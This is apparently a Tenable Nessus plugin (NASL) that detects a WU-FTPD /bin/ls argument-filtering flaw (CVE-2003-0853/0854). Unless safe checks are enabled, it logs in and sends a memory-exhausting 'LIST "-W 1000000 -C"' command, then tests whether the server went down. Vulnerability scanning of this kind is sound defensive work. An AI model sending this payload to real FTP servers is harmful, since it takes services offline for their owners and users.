#
# (C) Tenable Network Security, Inc.
#

# HD Moore suggested fixes and the safe_checks code.
# It is released under the General Public License (GPLv2).
# 
# Credit: Georgi Guninski discovered this attack
#


include("compat.inc");

if (description)
{
 script_id(11912);
 script_bugtraq_id(8875);
 script_cve_id("CVE-2003-0853", "CVE-2003-0854");
 script_xref(name:"OSVDB", value:"4620");
 script_xref(name:"OSVDB", value:"4621");
 script_xref(name:"Secunia", value:"10059");
 if (defined_func("script_xref"))
 {
   script_xref(name: "CONECTIVA", value: "CLA-2003:768");
   script_xref(name: "zone-h", value: "3299");
 }
 script_version("$Revision: 1.11 $");

 script_name(english:"WU-FTPD fileutils/coreutils ls -w Argument Memory Consumption DoS");

 script_set_attribute(attribute:"synopsis", value:
"The remote FTP server has a denial of service vulnerability." );
 script_set_attribute(attribute:"description", value:
"The version of WU-FTPD on the remote server uses a vulnerable version of
/bin/ls. It does not filter arguments to /bin/ls, which could lead to a DoS.
It is possible to consume all available memory on the machine 
by sending :

ls '-w 1000000 -C'" );
 script_set_attribute(attribute:"see_also", value:"http://www.guninski.com/binls.html" );
 script_set_attribute(attribute:"solution", value:
"Contact your vendor for a fix." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C" );

script_end_attributes();

 script_summary(english: "send ls -w 1000000 -C to the remote FTP server");

 script_category(ACT_MIXED_ATTACK);
 script_family(english: "FTP");

 script_copyright(english: "Copyright (C) 2003-2009 Tenable Network Security, Inc.");
 script_dependencie("find_service1.nasl", "ftp_anonymous.nasl");
 script_require_ports("Services/ftp", 21);
 exit(0);
}


#

include("ftp_func.inc");

port = get_kb_item("Services/ftp");
if (!port) port = 21;
if (!get_port_state(port)) exit(0);

banner = get_ftp_banner(port:port);

if ( !banner || !egrep(pattern:"wu-[0-9]\.", string:banner) ) exit(0);

user = get_kb_item("ftp/login");
pass = get_kb_item("ftp/password");

if (! user) user = "anonymous";
if (! pass) pass = "nessus@example.com";

soc = open_sock_tcp(port);
if (!soc) exit(0);

if (! ftp_authenticate(socket:soc, user: user, pass: pass)) exit(0);

port2 = ftp_pasv(socket:soc);
if (!port2)
{
  ftp_close(socket: soc);
  exit(0);
}

soc2 = open_sock_tcp(port2, transport: ENCAPS_IP);

if (!soc2 || safe_checks())
{
  send(socket: soc, data: 'LIST -ABCDEFGHIJKLMNOPQRSTUV\r\n');
  r1 = ftp_recv_line(socket:soc);
  if (egrep(string: r1, pattern: "invalid option|usage:", icase: 1))
    security_hole(port);
 if(soc2)close(soc2);
 ftp_close(socket: soc);
 exit(0);
}
  
start_denial();

send(socket:soc, data: 'LIST "-W 1000000 -C"\r\n');
r1 = ftp_recv_line(socket:soc);
l = ftp_recv_listing(socket: soc2);
r2 = ftp_recv_line(socket:soc);
close(soc2);
ftp_close(socket: soc);

alive = end_denial();
if (! alive)
{
  security_hole(port);
  exit(0);
}

if (egrep(string: r2, pattern: "exhausted|failed", icase: 1))
{
  security_hole(port);
  exit(0);
}

soc = open_sock_tcp(port);
if (! soc || ! ftp_authenticate(socket:soc, user: user, pass: pass))
  security_hole(port);
if (soc) ftp_close(socket: soc);

